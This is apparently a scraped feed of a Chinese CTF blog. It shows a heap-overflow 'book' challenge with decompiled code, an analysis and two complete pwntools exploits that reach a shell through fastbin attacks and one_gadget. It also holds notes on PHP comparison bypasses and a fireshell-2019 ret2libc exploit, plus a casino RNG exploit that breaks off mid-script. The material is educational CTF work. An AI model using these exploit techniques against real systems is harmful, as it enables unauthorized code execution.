class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">    保护： </span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">int add_book()</span><br><span class="line">&#123;</span><br><span class="line">  size_t size; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  for ( HIDWORD(size) = 0; HIDWORD(size) &lt;= 0xF &amp;&amp; ptr[5 * HIDWORD(size)]; ++HIDWORD(size) )</span><br><span class="line">    ;</span><br><span class="line">  if ( HIDWORD(size) == 16 )</span><br><span class="line">    puts(&quot;Too many books&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  puts(&quot;What is the author name?&quot;);</span><br><span class="line">  readn(0x28LL * HIDWORD(size) + 0x602060, 0x1F);</span><br><span class="line"></span><br><span class="line">  puts(&quot;How long is the book name?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;size);</span><br><span class="line"></span><br><span class="line">  if ( (unsigned int)size &gt; 0x50 )</span><br><span class="line">    return puts(&quot;Too big!&quot;);</span><br><span class="line">  ptr[5 * HIDWORD(size)] = malloc((unsigned int)size);</span><br><span class="line">  puts(&quot;What is the name of the book?&quot;);</span><br><span class="line">  readn(ptr[5 * HIDWORD(size)], size);          // size==0 时，溢出</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 漏洞函数</span><br><span class="line">__int64 __fastcall readn(__int64 a1, int len)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned int v3; // eax</span><br><span class="line">  unsigned __int8 buf; // [rsp+1Bh] [rbp-5h]</span><br><span class="line">  unsigned int v5; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v5 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (unsigned int)(len - 1);</span><br><span class="line">    if ( (unsigned int)result &lt;= v5 )</span><br><span class="line">      break;</span><br><span class="line">    read(0, &amp;buf, 1uLL);</span><br><span class="line">    result = buf;</span><br><span class="line">    if ( buf == &apos;\n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    v3 = v5++;</span><br><span class="line">    *(_BYTE *)(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sellbook()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Which book do you want to sell?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;idx);</span><br><span class="line">  if ( idx &gt; 0x10 )</span><br><span class="line">    return puts(&quot;Out of bound!&quot;);</span><br><span class="line">  if ( !ptr[5 * idx] )                          // ptr as inuse</span><br><span class="line">    return puts(&quot;No such book!&quot;);</span><br><span class="line">  free((void *)ptr[5 * idx]);</span><br><span class="line">  ptr[5 * idx] = 0LL;                           // ptr=0</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int readbook()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Which book do you want to sell?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;idx);</span><br><span class="line">  if ( idx &gt; 0x10 )</span><br><span class="line">    return puts(&quot;Out of bound!&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if ( ptr[5 * idx] )                           // 检查ptr</span><br><span class="line">    return printf(&quot;Author:%s\nBookname:%s\n&quot;, 0x28LL * idx + 0x602060, ptr[5 * idx]);    -&gt;%s泄漏信息</span><br><span class="line">  return puts(&quot;No such book!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>在输入size为0时readn函数漏洞，此时可以输入无限长度，可以溢出。结合readbook函数可以泄露堆地址；</p><p>fastbin attack将chunk分配到bss段存储指针及author name的地方，修改指针为某一函数got地址计算得到libc基址。</p><p>之后就需要getshell了，想法有：</p><ol><li>写got表，但是full relro，所以不行；</li><li>复写malloc_hook或free_hook,这个尝试了半天，因为在malloc_hook附近分配时需要用0x7f绕过大小检查，但是用户自己申请的大小最大为0x50，最终size最大便是0x60，于是想直接在bss段伪造0x70大小的chunk，并free掉，但是坑爹的是bss段一共就只有0x7f大小。。。最终放弃；</li><li>无奈之下，尝试将chunk分配到栈中覆盖返回地址，终于getshell！！</li></ol><p>从出题的学长那里学到了另一种思路</p><ol><li>利用fastbin attack将一个伪造的size作为fd放入fastbinY中，而该指针会在main_arena 处存放，然后我们可以将其作为fakechunk的size，将chunk分配到main_arena处</li><li>分配过去之后，就可以修改main_arena处存放的top chunk地址，此时将top chunk地址提到malloc hook之上，再次申请一个chunk，如果选择的size在fastbinY中不存在，那么便会从topchunk中切割，也就会分配到malloc hook之上</li><li>修改最后一个chunk的内容即修改malloc hook的值</li></ol><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#sh= process(&apos;./book&apos;)#[&apos;./book&apos;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)</span><br><span class="line">sh =remote(&apos;159.65.68.241&apos;,&apos;10004&apos;)</span><br><span class="line">elf = ELF(&apos;./book&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(a_name,size,b_name):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;author name?\n&apos;)</span><br><span class="line">sh.sendline(a_name)</span><br><span class="line">sh.recvuntil(&apos;book name?\n&apos;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&apos;book?\n&apos;)</span><br><span class="line">sh.sendline(b_name)</span><br><span class="line"></span><br><span class="line">def read(idx):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;sell?\n&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;sell?\n&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;)</span><br><span class="line">add(&apos;c&apos;,0,&apos;d&apos;)</span><br><span class="line">add(&apos;e&apos;,0,&apos;f&apos;)</span><br><span class="line">add(&apos;g&apos;,0,&apos;h&apos;)</span><br><span class="line">add(&apos;i&apos;,0,&apos;j&apos;)</span><br><span class="line">#--------leak heap_base-----------------#</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0)+p64(0x21),0,&apos;b&apos;*0x20)</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;b&apos;*0x20)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))-0x40</span><br><span class="line">print &apos;heap_base : &apos;+hex(heap_base)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#---------fastbin_attack leak libc_base-----------------#</span><br><span class="line">delete(4)</span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;A&apos;,0,&apos;b&apos;*0x10+p64(0)+p64(0x21)+p64(0x602060))</span><br><span class="line">add(&apos;f&apos;,0,&apos;wwwwwwww&apos;)</span><br><span class="line">add(&apos;a&apos;,0,&apos;a&apos;*0x10+p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">puts_got = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = puts_got- libc.symbols[&apos;puts&apos;]</span><br><span class="line">print &apos;libc_base : &apos;+hex(libc_base) </span><br><span class="line">environ_ptr_addr = libc_base + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">print &apos;environ_ptr_addr : &apos;+ hex(environ_ptr_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#---------get shell-------------------------------#</span><br><span class="line">one_gadget_off = 0x45216</span><br><span class="line">one_gadget_addr = one_gadget_off + libc_base</span><br><span class="line">malloc_hook_addr = libc_base + 0x3c4b10</span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(environ_ptr_addr))</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">environ_addr = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))</span><br><span class="line">rbp_addr = environ_addr-0xf8</span><br><span class="line">print &apos;one_gadget_addr : &apos;+hex(one_gadget_addr)</span><br><span class="line">print &apos;malloc_hook_addr : &apos;+hex(malloc_hook_addr)</span><br><span class="line">print &apos;rbp_addr : &apos;+hex(rbp_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+&apos;c&apos;*0x20+p64(0x6020b0)+&apos;d&apos;*0x10+p64(0x21))</span><br><span class="line">delete(2)</span><br><span class="line">delete(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+p64(rbp_addr-0x1e))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;\n&apos;,0x30,&apos;\n&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;c&apos;,0x30,&apos;a&apos;*0x16+p64(one_gadget_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./book&quot;)</span><br><span class="line">#p=remote(&quot;159.65.68.241&quot;,&quot;10004&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;,checksec=False)</span><br><span class="line">malloc_hook = libc.symbols[&quot;__malloc_hook&quot;]</span><br><span class="line">def add(name,size,content):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">    p.sendlineafter(&quot;name?&quot;,name)</span><br><span class="line">    p.sendlineafter(&quot;name?&quot;,str(size))</span><br><span class="line">    p.sendlineafter(&quot;book&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">    p.sendlineafter(&quot;sell?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def read(index):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)</span><br><span class="line">    p.sendlineafter(&quot;sell?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">code = ELF(&quot;./book&quot;,checksec=False)</span><br><span class="line">puts_got = code.got[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&quot;1&quot;,0,&quot;a&quot;)      #0</span><br><span class="line">add(&quot;2&quot;,0x40,&quot;b&quot;)  #1</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #2</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0x51)*2,0,&quot;a&quot;*0x18+p64(0x51)+p64(0x602060))  #0</span><br><span class="line">add(&quot;b&quot;,0x40,&quot;b&quot;)        #1</span><br><span class="line">add(&quot;c&quot;,0x40,&quot;c&quot;*0x10+p64(puts_got))  #3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(0)</span><br><span class="line">p.recvuntil(&quot;name:&quot;)</span><br><span class="line">puts_addr = p.recv(6)+&quot;\x00&quot;*2</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[&quot;puts&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">print(&quot;-------------------&quot;)</span><br><span class="line"></span><br><span class="line">add(&quot;d&quot;,0,&quot;d&quot;)       #4</span><br><span class="line">add(&quot;e&quot;,0x50,&quot;e&quot;)    #5</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #6</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">delete(5) </span><br><span class="line">delete(4)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(&quot;d&quot;,0,&quot;d&quot;*0x18+p64(0x61)+p64(0x51)+&quot;123&quot;)  #4</span><br><span class="line">add(&quot;e&quot;,0x50,&quot;e&quot;)    #5</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;g&quot;,0,&quot;d&quot;)       #6</span><br><span class="line">add(&quot;h&quot;,0x40,&quot;e&quot;)    #7</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #8</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)</span><br><span class="line"></span><br><span class="line">add(&quot;g&quot;,0,&quot;g&quot;*0x18+p64(0x51)+p64(libc_base+0x3c4b40)+&quot;123&quot;)  #8</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;h&quot;,0x40,&quot;g&quot;)   #7</span><br><span class="line">print hex(libc_base+0x3c4b40)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;i&quot;,0x40,p64(0)*5+p64(libc_base+0x3c4b00))  #9</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;exp&quot;,0,p64(libc_base+0x4526a))   #10</span><br><span class="line">print hex(libc_base+0x4526a)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;name?&quot;,&quot;aaa&quot;)</span><br><span class="line">p.sendlineafter(&quot;name?&quot;,&quot;0&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;华科一个新战队的招新题，正好最近没有兴致继续下去，来玩一玩招新题&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;stack&quot;&gt;&lt;a href=&quot;#stack&quot; class=&quot;headerlink&quot; title=&quot;stack&quot;&gt;&lt;/a&gt;stack&lt;/h1&gt;&lt;p&gt;最简单的栈溢出&lt;/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Fun with PHP Code Audit</title>
    <link href="http://siriuswhiter.tk/2019/01/31/fun-with-php-code-audit/"/>
    <id>http://siriuswhiter.tk/2019/01/31/fun-with-php-code-audit/</id>
    <published>2019-01-31T07:47:31.000Z</published>
    <updated>2019-01-31T08:07:35.604Z</updated>
    
    <content type="html"><![CDATA[<p><em>pwn的头疼＋心累，玩一玩入门的PHP代码审计</em></p><h1 id="基础传参"><a href="#基础传参" class="headerlink" title="基础传参"></a>基础传参</h1><p>从最基本的来说，常用的网页传参即 GET 与 POST<br>对于用户来讲，GET传参就是往网页链接后面直接添加参数，比如说<a href="https://test.php?a=1" target="_blank" rel="noopener">https://test.php?a=1</a>;<br>而POST传参一般需要写个脚本或者使用插件，比如说火狐浏览器的hackbar插件。</p><h1 id="简单的PHP函数检测绕过"><a href="#简单的PHP函数检测绕过" class="headerlink" title="简单的PHP函数检测绕过"></a>简单的PHP函数检测绕过</h1><ol><li>is_numeric: 检测是否为数字，但是如果输入 数字＋字母 （1ab）便能过检测，但是 php中 1ab ==1 为true</li><li>extract： 从数组中将变量导入到当前的符号表。使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 但一般若设置为空，则有希望通过判断</li><li>对于数字之间的比较，通常可以使用数组来绕过，比如说 strcmp，strpos，MD5 ，sha1 等对两个用户输入字符串比较的，都可以使用数组尝试</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;pwn的头疼＋心累，玩一玩入门的PHP代码审计&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;基础传参&quot;&gt;&lt;a href=&quot;#基础传参&quot; class=&quot;headerlink&quot; title=&quot;基础传参&quot;&gt;&lt;/a&gt;基础传参&lt;/h1&gt;&lt;p&gt;从最基本的来说，常用的网页传参即 GET 与
      
    
    </summary>
    
      <category term="web" scheme="http://siriuswhiter.tk/categories/web/"/>
    
    
      <category term="web" scheme="http://siriuswhiter.tk/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>fireshell-2019-pwn</title>
    <link href="http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/"/>
    <id>http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/</id>
    <published>2019-01-29T09:09:33.000Z</published>
    <updated>2019-02-08T06:52:36.780Z</updated>
    
    <content type="html"><![CDATA[<p><em>本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭</em></p><h1 id="leakless"><a href="#leakless" class="headerlink" title="leakless"></a>leakless</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char buf; // [esp+0h] [ebp-48h]</span><br><span class="line">return read(0, &amp;buf, 0x100u);</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一个简单的栈溢出，第一反应是去泄露libc版本，后面又突然想着把shellcode写到bss段，但是奈何总是不成功，vmmap才发现bss段不可执行，且不存在能够wx的段，因为以前用LibcSearcher没成功（ps:完全不记得为什么），偏偏用DynElf爆破失败，所以还是转向LibcSearcher.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./leakless&apos;)</span><br><span class="line">libc = ELF(&apos;./leakless&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(libc.symbols[&apos;puts&apos;])+p32(libc.symbols[&apos;feedme&apos;]) +p32(libc.got[&apos;puts&apos;])</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">puts_got_addr = u32(sh.recv(4))</span><br><span class="line">print &quot;puts_got_addr: &quot;+hex(puts_got_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(&quot;puts&quot;,puts_got_addr)</span><br><span class="line"></span><br><span class="line">system_addr = puts_got_addr - obj.dump(&apos;puts&apos;)+obj.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = puts_got_addr - obj.dump(&apos;puts&apos;) + obj.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"> </span><br><span class="line">success( &quot;system_addr: &quot;+hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(system_addr) + p32(libc.symbols[&apos;main&apos;]) + p32(binsh_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="casino"><a href="#casino" class="headerlink" title="casino"></a>casino</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>用户输入的值与随机数匹配成功100次，之后会读取flag.txt文件并输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seed = (unsigned int)time(0LL) / 10;</span><br><span class="line">seed += bet;(bet=1)</span><br><span class="line">srand(seed);</span><br><span class="line">rand();</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>格式化字符串漏洞，但是大小限制在了0x10，能够泄露出来seed，也就能预测第一次的值，然后因为要泄露100次，想着顺便把栈上的记录次数的值或者bet一起改掉，但是因为长度限制，最后有点懵。感觉二者不可得兼。</p><p>看大佬们的wp，因为seed是用time(0)/10+ bet ,可以先自己先利用time将seed计算出来，然后计算rand();因为python和c的rand()不同，所以得考虑如何将在python脚本中计算c的随机数，可以有：</p><ol><li>单独写一份c的程序计算随机数，脚本中调用c程序(昨天也是这么做的)； </li><li>使用python和c的混合编程包：ctypes。</li></ol><p>经实践，同一个seed得到的随机数序列都是一样的…，而题中通过time(0)/10对seed给了容错</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">now=int(time())/10+2</span><br><span 